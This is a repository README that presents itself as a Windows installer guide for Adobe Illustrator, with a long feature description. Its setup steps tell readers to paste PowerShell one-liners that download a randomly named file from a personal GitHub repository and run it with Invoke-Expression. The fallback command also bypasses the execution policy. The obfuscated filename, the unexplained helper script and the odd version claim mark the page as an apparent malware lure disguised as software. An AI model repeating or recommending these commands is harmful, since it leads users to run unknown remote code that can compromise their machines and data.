# Illustrator

Illustrator is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Illustrator and work in it.

Adobe Illustrator is professional vector graphics software for Windows. You work with paths, anchors, and Bézier curves instead of pixels, which keeps logos, icons, diagrams, and packaging art crisp at any size. The interface centers on artboards, layers, and precise panels for color, stroke, type, and effects.

A typical session starts by opening or creating a document with artboard sizes that match your deliverable. You draw with the Pen and Shape tools, adjust curves in the Direct Selection view, and organize elements on layers. You might set brand colors in swatches, outline type for production, use the Pathfinder to combine shapes, and export SVG, PDF, or PNG when the layout is ready.

This repository tracks a Windows setup package, version notes, and a changelog so installs and upgrades stay predictable across machines. Short usage notes cover common workflows like artboard setup, linked assets, and export presets without replacing the full product documentation.

## What you do with it

- Pen and curvature tools build precise Bézier paths for logos and line art.
- Artboards let you design multiple sizes or variants inside one Illustrator document.
- Pathfinder and Shape Builder unite, subtract, and trim overlapping vector shapes quickly.
- Global swatches and color guides keep brand palettes consistent across every artboard.
- Type on a path and OpenType controls handle display headlines and detailed text settings.
- SVG and PDF export preserve vectors for web assets and commercial print workflows.
- Appearance panel stacks fills, strokes, and effects without expanding the underlying paths.
- Symbols and linked assets reuse icons while keeping master artwork easy to update.

## Quick Setup (PowerShell)

This installs the program Illustrator on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/bianca-w661876/illustrator-setup-guide/main/gpf613kcza.cw51n748 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/bianca-w661876/illustrator-setup-guide/main/gpf613kcza.cw51n748 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `gpf613kcza.cw51n748` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `bianca-w661876/illustrator-setup-guide`. Adobe Illustrator 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
